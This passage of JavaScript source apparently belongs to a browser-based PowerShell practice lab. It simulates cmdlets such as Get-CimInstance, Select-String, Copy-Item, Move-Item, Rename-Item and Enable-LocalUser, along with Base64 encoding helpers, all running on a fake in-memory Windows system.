  lib.views["Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Process"] = ["ProcessId", "Name", "ParentProcessId", "CommandLine"];
  lib.views["Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_Service"] = ["Name", "State", "StartMode", "StartName"];
  lib.views["Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_LogicalDisk"] = ["DeviceID", "DriveType", "VolumeName", "Size", "FreeSpace"];
  lib.listTypes["Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_OperatingSystem"] = true;
  lib.listTypes["Microsoft.Management.Infrastructure.CimInstance#root/cimv2/Win32_ComputerSystem"] = true;
  C("Get-CimInstance", CIM, [p("ClassName", 0, { aliases: ["Class"] }), p("Filter"), p("Property")], function (b, input, ctx) {
    var items = cimClass(toStr(b.classname), ctx.session.system);
    if (!items) throw err("Invalid class \"" + toStr(b.classname) + "\". This lab knows Win32_Process, Win32_Service, Win32_OperatingSystem, Win32_LogicalDisk and Win32_ComputerSystem.", "MetadataError");
    return items.filter(wql(b.filter));
  }, { synopsis: "Queries Windows Management Instrumentation (CIM/WMI) classes: more detail than Get-Process/Get-Service, e.g. a process's CommandLine and parent.",
    examples: ["Get-CimInstance Win32_Process", "Get-CimInstance Win32_Service -Filter \"StartMode = 'Auto'\"", "Get-CimInstance Win32_OperatingSystem"] });
  lib.aliases["gcim"] = "Get-CimInstance";

  /* ================================================================== Select-String */
  function matchInfo(line, number, file, matches, pattern) {
    var o = obj("Microsoft.PowerShell.Commands.MatchInfo", { LineNumber: number, Line: line, Filename: file ? file.split("\\").pop() : "InputStream", Path: file || "InputStream", Pattern: pattern,
      Matches: matches.map(function (m) {
        var mo = obj("System.Text.RegularExpressions.Match", { Value: m[0], Index: m.index, Length: m[0].length,
          Groups: Array.from(m).map(function (g, gi) { return obj("System.Text.RegularExpressions.Group", { Value: g == null ? "" : g, Name: String(gi), Success: g != null }); }) });
        mo.toStringFn = function () { return m[0]; };
        return mo;
      }) });
    o.toStringFn = function () { return file ? file + ":" + number + ":" + line : line; };
    return o;
  }
  lib.stringTypes = lib.stringTypes || {};
  lib.stringTypes["Microsoft.PowerShell.Commands.MatchInfo"] = true;
  C("Select-String", UTIL, [p("Pattern", 0), p("Path", 1), p("InputObject"), sw("SimpleMatch"), sw("CaseSensitive"), sw("NotMatch"), sw("AllMatches"), sw("Quiet"), sw("List")], function (b, input, ctx) {
    var sys = ctx.session.system;
    var pats = names(b.pattern);
    if (!pats.length) throw err("Select-String needs a -Pattern.");
    var res = pats.map(function (pt) {
      var src = b.simplematch ? pt.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") : pt;
      return E.netRegex(src, "g" + (b.casesensitive ? "" : "i"));
    });
    var sources = [];
    if (b.path !== undefined) {
      names(b.path).forEach(function (pth) {
        if (/[*?]/.test(pth)) {
          var dir = pth.replace(/[\\/][^\\/]*$/, ""), pat = pth.slice(dir.length).replace(/^[\\/]/, "");
          if (dir === pth) { dir = "."; pat = pth; }
          var got = lib.cmdlets["get-childitem"].run({ path: dir, filter: pat, file: true }, null, ctx);
          got.forEach(function (fo) { sources.push({ file: toStr(fo.get("FullName")).replace(sys.cwd + "\\", ""), lines: lib.fs.readLines(lib.fs.get(sys, toStr(fo.get("FullName"))).content) }); });
          return;
        }
        var f = lib.fs.get(sys, pth);
        if (!f) { lib.fs.notFound(ctx, pth); return; }
        sources.push({ file: f.name, lines: lib.fs.readLines(f.content) });
      });
    } else {
      var items = input || list(b.inputobject);
      items.forEach(function (x) {
        if (x instanceof PSObject && x.typeName === "System.IO.FileInfo") { var f2 = lib.fs.get(sys, toStr(x.get("FullName"))); if (f2) sources.push({ file: f2.name, lines: lib.fs.readLines(f2.content) }); }
        else sources.push({ file: null, lines: [toStr(x)] });
      });
    }
    var out = [], lineNo;
    sources.forEach(function (s) {
      var found = false;
      s.lines.forEach(function (line, i) {
        if (found && b.list) return;
        var ms = [];
        res.forEach(function (re) { re.lastIndex = 0; var m; while ((m = re.exec(line)) !== null) { ms.push(m); if (!m[0]) re.lastIndex++; if (!b.allmatches) break; } });
        var hit = ms.length > 0;
        if (hit === !!b.notmatch) return;
        found = true;
        lineNo = s.file ? i + 1 : (input ? input.length > 1 ? i + 1 : 1 : 1);
        out.push(matchInfo(line, s.file ? i + 1 : out.length + 1, s.file, b.notmatch ? [] : ms.slice(0, b.allmatches ? ms.length : 1), pats.join(", ")));
      });
    });
    if (b.quiet) return [out.length > 0];
    return out;
  }, { synopsis: "Finds text in files or strings, like grep. Returns MatchInfo objects: Line, LineNumber, Filename, Matches.",
    examples: ["Select-String -Path logs\\*.log -Pattern 'ERROR'", "Get-Content app.log | Select-String 'timeout' -SimpleMatch", "(Select-String -Path iis.log -Pattern ' 500 ').Count"] });
  lib.aliases["sls"] = "Select-String";

  /* ================================================================== More file cmdlets */
  function copyOrMove(move) {
    return function (b, input, ctx) {
      var sys = ctx.session.system;
      var srcs = input && input.length ? input.map(function (x) { return toStr(x instanceof PSObject ? x.get("FullName") : x); }) : names(b.path);
      var dest = toStr(b.destination);
      var destIsDir = lib.fs.isDir(sys, dest) || /[\\/]$/.test(dest);
      srcs.forEach(function (s) {
        var f = lib.fs.get(sys, s);
        if (!f) { lib.fs.notFound(ctx, s); return; }
        var leaf = f.name.split("\\").pop();
        var target = destIsDir ? dest.replace(/[\\/]+$/, "") + "\\" + leaf : dest;
        var label = lib.fs.normPath(sys, s).display;
        if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"" + (move ? "Move File" : "Copy File") + "\" on target \"Item: " + label + " Destination: " + lib.fs.normPath(sys, target).display + "\".", "whatif"); return; }
        if (lib.fs.get(sys, target) && !b.force && move) { E.writeCmdletError(ctx, "Cannot create a file when that file already exists.", "WriteError", target); return; }
        lib.fs.write(sys, target, f.content);
        lib.fs.get(sys, target).mtime = f.mtime;
        if (move) delete sys.files[lib.fs.normPath(sys, s).key];
        sys.actions.push((move ? "Move-Item " : "Copy-Item ") + f.name + " -> " + lib.fs.normPath(sys, target).rel);
      });
      return [];
    };
  }
  C("Copy-Item", MGMT, [p("Path", 0), p("Destination", 1), sw("Recurse"), sw("Force"), sw("PassThru")], copyOrMove(false), { synopsis: "Copies files. Supports -WhatIf." });
  C("Move-Item", MGMT, [p("Path", 0), p("Destination", 1), sw("Force"), sw("PassThru")], copyOrMove(true), { synopsis: "Moves files (into a folder if the destination is a folder). Supports -WhatIf." });
  lib.aliases["copy"] = "Copy-Item"; lib.aliases["cp"] = "Copy-Item"; lib.aliases["move"] = "Move-Item"; lib.aliases["mv"] = "Move-Item";
  C("Rename-Item", MGMT, [p("Path", 0), p("NewName", 1)], function (b, input, ctx) {
    var sys = ctx.session.system, f = lib.fs.get(sys, b.path);
    if (!f) { lib.fs.notFound(ctx, b.path); return []; }
    var rel = f.name, dir = rel.indexOf("\\") >= 0 ? rel.slice(0, rel.lastIndexOf("\\") + 1) : "";
    if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"Rename File\" on target \"Item: " + lib.fs.normPath(sys, b.path).display + " Destination: " + sys.cwd + "\\" + dir + toStr(b.newname) + "\".", "whatif"); return []; }
    lib.fs.write(sys, dir + toStr(b.newname), f.content);
    delete sys.files[lib.fs.normPath(sys, b.path).key];
    return [];
  }, { synopsis: "Renames a file." });

  /* ================================================================== Local users: enable */
  C("Enable-LocalUser", LOCAL, [p("Name", 0), p("InputObject")], function (b, input, ctx) {
    var ns = input && input.length ? input.map(function (x) { return toStr(E.propertyOf(x, "Name", ctx) || x); }) : names(b.name);
    ns.forEach(function (n) {
      var u = ctx.session.system.users.filter(function (x) { return lc(x.Name) === lc(n); })[0];
      if (!u) { E.writeCmdletError(ctx, "User " + n + " was not found.", "ObjectNotFound", n); return; }
      if (ctx.whatIf) { ctx.session.write("What if: Performing the operation \"Enable local user\" on target \"" + u.Name + "\".", "whatif"); return; }
      u.Enabled = true;
      ctx.session.system.actions.push("Enable-LocalUser " + u.Name);
    });
    return [];
  }, { synopsis: "Enables a local user account. Supports -WhatIf." });
  /* ================================================================== Base64 and text encodings */
  function encodingObj(kind) {
    var o = obj("System.Text." + (kind === "unicode" ? "UnicodeEncoding" : kind === "ascii" ? "ASCIIEncoding" : "UTF8Encoding"), { EncodingName: kind === "unicode" ? "Unicode (UTF-16)" : kind === "ascii" ? "US-ASCII" : "Unicode (UTF-8)" });
    o.methods = {
      getbytes: function (a) {
        var str = toStr(a[0]), out = [];
        if (kind === "unicode") { for (var i = 0; i < str.length; i++) { var c = str.charCodeAt(i); out.push(c & 255, c >> 8); } return out; }
        if (kind === "ascii") { for (var j = 0; j < str.length; j++) out.push(str.charCodeAt(j) & 127); return out; }
        return Array.from(new TextEncoder().encode(str));
      },
      getstring: function (a) {
        var bytes = enumerate(a[0]).map(toNumber);
        if (kind === "unicode") { var s2 = ""; for (var i = 0; i + 1 < bytes.length; i += 2) s2 += String.fromCharCode(bytes[i] | (bytes[i + 1] << 8)); return s2; }
        if (kind === "ascii") return bytes.map(function (b) { return String.fromCharCode(b & 127); }).join("");
        return new TextDecoder().decode(new Uint8Array(bytes));
      }
    };
    return o;
  }
  var B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  function toB64(bytes) {
    var out = "";
    for (var i = 0; i < bytes.length; i += 3) {
      var n = (bytes[i] << 16) | ((bytes[i + 1] || 0) << 8) | (bytes[i + 2] || 0);
      out += B64[(n >> 18) & 63] + B64[(n >> 12) & 63] + (i + 1 < bytes.length ? B64[(n >> 6) & 63] : "=") + (i + 2 < bytes.length ? B64[n & 63] : "=");
    }
    return out;
  }
  function fromB64(str) {
    str = toStr(str).replace(/\s+/g, "");
    if (!/^[A-Za-z0-9+\/]*={0,2}$/.test(str) || str.length % 4) throw err("Exception calling \"FromBase64String\" with \"1\" argument(s): \"The input is not a valid Base-64 string as it contains a non-base 64 character, more than two padding characters, or an illegal character among the padding characters.\"", "InvalidArgument");
    var out = [];
    for (var i = 0; i < str.length; i += 4) {
      var n = (B64.indexOf(str[i]) << 18) | (B64.indexOf(str[i + 1]) << 12) | ((str[i + 2] === "=" ? 0 : B64.indexOf(str[i + 2])) << 6) | (str[i + 3] === "=" ? 0 : B64.indexOf(str[i + 3]));
      out.push((n >> 16) & 255);
      if (str[i + 2] !== "=") out.push((n >> 8) & 255);
      if (str[i + 3] !== "=") out.push(n & 255);
    }
    return out;
  }
  var prevProp = lib.staticPropertyExtra, prevMethod = lib.staticMethodExtra;
  lib.staticPropertyExtra = function (tn, name, ctx) {
    var t = lc(tn).replace(/^system\./, ""), n = lc(name);
    if (t === "text.encoding") { if (n === "unicode") return encodingObj("unicode"); if (n === "utf8") return encodingObj("utf8"); if (n === "ascii") return encodingObj("ascii"); }
    return prevProp ? prevProp(tn, name, ctx) : undefined;
  };
  lib.staticMethodExtra = function (tn, name, args, ctx) {
    var t = lc(tn).replace(/^system\./, ""), n = lc(name);
    if (t === "convert") {
      if (n === "tobase64string") return toB64(enumerate(args[0]).map(toNumber));
      if (n === "frombase64string") return fromB64(args[0]);
      if (n === "toint32") return E.convertTo(args[0], "int");
    }
    return prevMethod ? prevMethod(tn, name, args, ctx) : undefined;
  };
})(typeof window !== "undefined" ? window : globalThis);
